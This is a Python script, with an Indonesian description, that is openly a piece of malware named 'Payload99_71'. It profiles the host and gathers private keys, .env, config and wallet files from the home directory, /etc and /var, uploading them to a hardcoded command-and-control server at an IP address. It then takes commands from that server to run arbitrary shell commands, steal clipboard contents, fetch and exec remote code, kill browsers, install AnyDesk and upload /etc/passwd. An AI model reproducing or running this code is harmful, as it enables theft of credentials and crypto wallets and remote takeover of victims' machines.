import os
import platform
import socket
import requests
import subprocess
import json
import shutil

kegunaan = """
🔹 Fungsi Utama:

Sama seperti Payload99_31, tetapi lebih stealthy.
Mencari dan menyalin file sensitif sebelum diunggah ke C2.
Mengeksekusi perintah dari C2 secara lebih fleksibel.

🔹 Karakteristik:
Menyalin file sensitif ke folder tersembunyi sebelum diunggah ke C2.
Mengunggah informasi ke C2 /keys, lalu mengunggah file ke /uploads.
Mengeksekusi perintah dari C2 tanpa koneksi persisten.

🔹 Kegunaan:
✔ Eksfiltrasi lebih stealthy, menyembunyikan file sebelum dikirim.
✔ Serangan lebih fleksibel, memungkinkan eksekusi perintah tambahan sebelum berhenti.

"""

def collect_system_info():
    system_info = {
        "os": platform.system(),
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
    }
    return system_info


def send_data_to_c2(data):
    url_c2 = "http://5.253.43.122:1224/keys"
    try:
        response = requests.post(url_c2, json=data, timeout=10)
        if response.status_code == 200:
            print("[+] System info sent successfully.")
        else:
            print("[-] Failed to send system info.")
    except requests.RequestException:
        print("[-] Error connecting to C2.")


def search_and_copy_sensitive_files():
    search_paths = [os.path.expanduser("~"), "/etc", "/var"]
    copied_files = []
    dest_dir = os.path.join(os.getcwd(), "exfiltrated_files")
    os.makedirs(dest_dir, exist_ok=True)

    for path in search_paths:
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if any(ext in file for ext in [".pem", ".key", "config", ".env", ".wallet"]):
                        src_file = os.path.join(root, file)
                        dest_file = os.path.join(dest_dir, file)
                        shutil.copy2(src_file, dest_file)
                        copied_files.append(dest_file)
    return copied_files


def upload_files_to_c2(files):
    url_c2 = "http://5.253.43.122:1224/uploads"
    for file in files:
        try:
            with open(file, "rb") as f:
                requests.post(url_c2, files={"file": f}, timeout=10)
            print(f"[+] Uploaded: {file}")
        except Exception:
            print(f"[-] Failed to upload: {file}")


def execute_remote_commands():
    url_c2 = "http://5.253.43.122:1224/cmd"
    try:
        response = requests.get(url_c2, timeout=10)
        if response.status_code == 200:
            commands = response.json().get("commands", [])
            for cmd in commands:
                if cmd.startswith("SSH_OBJ"):
                    os.system(cmd.replace("SSH_OBJ ", ""))
                elif cmd == "SSH_CMD":
                    os.system("taskkill /IM python.exe /F")
                elif cmd == "SSH_CLIP":
                    clipboard_data = subprocess.check_output("powershell Get-Clipboard", shell=True)
                    requests.post("http://5.253.43.122:1224/clip", json={"clipboard": clipboard_data.decode()})
                elif cmd.startswith("SSH_RUN"):
                    url = cmd.split(" ")[1]
                    payload = requests.get(url).text
                    exec(payload)
                elif cmd == "SSH_KILL":
                    os.system("taskkill /IM chrome.exe /F && taskkill /IM brave.exe /F")
                elif cmd == "SSH_ANY":
                    os.system("wget http://5.253.43.122:1224/anydesk -O /tmp/anydesk && chmod +x /tmp/anydesk && /tmp/anydesk")
                elif cmd == "SSH_ENV":
                    env_files = ["/etc/passwd", os.path.expanduser("~/.bashrc"), os.path.expanduser("~/.zshrc")]
                    for file in env_files:
                        if os.path.exists(file):
                            with open(file, "r") as f:
                                requests.post("http://5.253.43.122:1224/uploads", files={"file": f})
    except requests.RequestException:
        print("[-] Error fetching commands from C2.")


def main():
    print("[+] Payload99_71 executing...")
    system_info = collect_system_info()
    send_data_to_c2(system_info)

    files = search_and_copy_sensitive_files()
    if files:
        upload_files_to_c2(files)

    execute_remote_commands()
    print("[+] Payload99_71 execution completed.")


if __name__ == "__main__":
    main()
